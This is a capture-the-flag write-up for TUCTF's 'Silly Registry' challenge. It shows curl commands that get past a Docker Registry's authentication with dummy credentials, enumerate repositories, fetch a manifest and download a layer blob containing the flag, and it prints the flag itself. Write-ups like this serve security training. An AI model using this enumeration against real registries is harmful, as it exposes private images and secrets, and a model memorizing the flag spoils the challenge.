# Silly Registry [83 Solves]

## Description

> Everything about this registry is silly!
>
> `chal.tuctf.com:30003`

## Flag

TUCTF{my_51lly_53cr37_15_54f3_w17h_y0u}

## Solution

This challenge endpoint is Docker Registry API.

- [5000 - Pentesting Docker Registry - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)

Auth is required but it can be bypassed by dummy user (e.g. `user:pass` credential).
Detect silly-container service tag and fetch its manifest.
then, get the blob and extract it.

```console
$ curl -s -u user:pass http://chal.tuctf.com:30003/v2/_catalog
{"repositories":["silly-container"]}

$ curl -s -u user:pass http://chal.tuctf.com:30003/v2/silly-container/tags/list
{"name":"silly-container","tags":["latest"]}

$ curl -s -u user:pass http://chal.tuctf.com:30003/v2/silly-container/manifests/latest
{
   "schemaVersion": 1,
   "name": "silly-container",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:cb4b479aa0aecd737667fbfcceb60f7c1bd9dda82acec2ff8841a48c7a8c627b"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:7264a8db6415046d36d16ba98b79778e18accee6ffa71850405994cffa9be7de"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"OnBuild\":null},\"created\":\"2023-09-18T04:47:37.053052193Z\",\"id\":\"0081e0af272b7ef1fa894f620bdcf8f87178b9b2fad77abf5447176bbdedc7dd\",\"os\":\"linux\",\"parent\":\"0a58ea0cbdf7a831e5b92f945b32fbd2ef82f57436bea99335802ae47baf1959\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"0a58ea0cbdf7a831e5b92f945b32fbd2ef82f57436bea99335802ae47baf1959\",\"parent\":\"d625e347fd805c6f1b9083d12a28e98c34d63fa644945fa1e874776ad50441d2\",\"created\":\"2023-08-07T19:20:20.894140623Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"d625e347fd805c6f1b9083d12a28e98c34d63fa644945fa1e874776ad50441d2\",\"created\":\"2023-08-07T19:20:20.71894984Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:32ff5e7a78b890996ee4681cc0a26185d3e9acdb4eb1e2aaccb2411f922fed6b in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "IQJ4:VJAG:MSSV:PKWX:J3PF:GPAZ:CVXU:LHP6:WJ3Q:3LLK:33KS:QZLP",
               "kty": "EC",
               "x": "OloWm_iEFgfn0bUc0wtPwAl2_YqOe4PzqqYC24yl0To",
               "y": "QV1knZcm83dag_76BZ8bEl7JGpAS6LDaiJQO8kbVSoA"
            },
            "alg": "ES256"
         },
         "signature": "fDtjFLadmEmVb2dVZS43lYmWrBxGO7uuCsLLeyWLPT-dL9aiOMAC1vLHn6jL-DlXZK_Bwiln6YSgDfXHUurnSA",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjE1NjAsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMy0xMi0wM1QxNjowMjoxMFoifQ"
      }
   ]
} 

$ curl -s -u user:pass http://chal.tuctf.com:30003/v2/silly-container/blobs/sha256:cb4b479aa0aecd737667fbfcceb60f7c1bd9dda82acec2ff8841a48c7a8c627b -o blob1.tar

$ file blob1.tar
blob1.tar: gzip compressed data, original size modulo 2^32 2048

$ tar xvf blob1.tar
flag.txt

$ cat flag.txt
TUCTF{my_51lly_53cr37_15_54f3_w17h_y0u}
```
